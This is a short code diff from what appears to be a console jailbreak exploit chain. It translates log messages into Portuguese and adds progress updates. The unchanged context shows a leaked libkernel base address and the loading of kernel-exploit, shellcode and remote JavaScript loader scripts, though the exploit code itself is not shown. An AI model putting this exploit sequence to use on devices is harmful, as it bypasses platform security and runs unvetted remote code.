         TITLE_ID = get_title_id();
         
-        send_notification(version_string + "\nFW : " + FW_VERSION + "\nTitle ID : " + TITLE_ID + "\nAppVer : " + Y2_VERSION);
-        await log("FW detected : " + FW_VERSION);
-        await log("Title ID detected : " + TITLE_ID);
-        await log("AppVer detected : " + Y2_VERSION);
+        send_notification(version_string + "\nFW : " + FW_VERSION + "\nID do título : " + TITLE_ID + "\nVersão do app : " + Y2_VERSION);
+        await log("FW detectado : " + FW_VERSION);
+        await log("ID do título detectado : " + TITLE_ID);
+        await log("Versão do app detectada : " + Y2_VERSION);
         
         await log("libkernel_base @ " + toHex(libkernel_base));
 
+        updateProgress(50);
         await load_localscript('kernel.js');
         await load_localscript('aioshellcode.js');
         await load_localscript('kexp.js');
+        updateProgress(60);
         
         ////////////////////
-        // MAIN EXECUTION //
+        // EXECUÇÃO PRINCIPAL //
         ////////////////////
 
         await load_localscript('remotejsloader.js'); 
 
         
     } catch (e) {                
-        await log('EXCEPTION: ' + e.message);
+        await log('EXCEÇÃO: ' + e.message);
         await log(e.stack);
     }
     
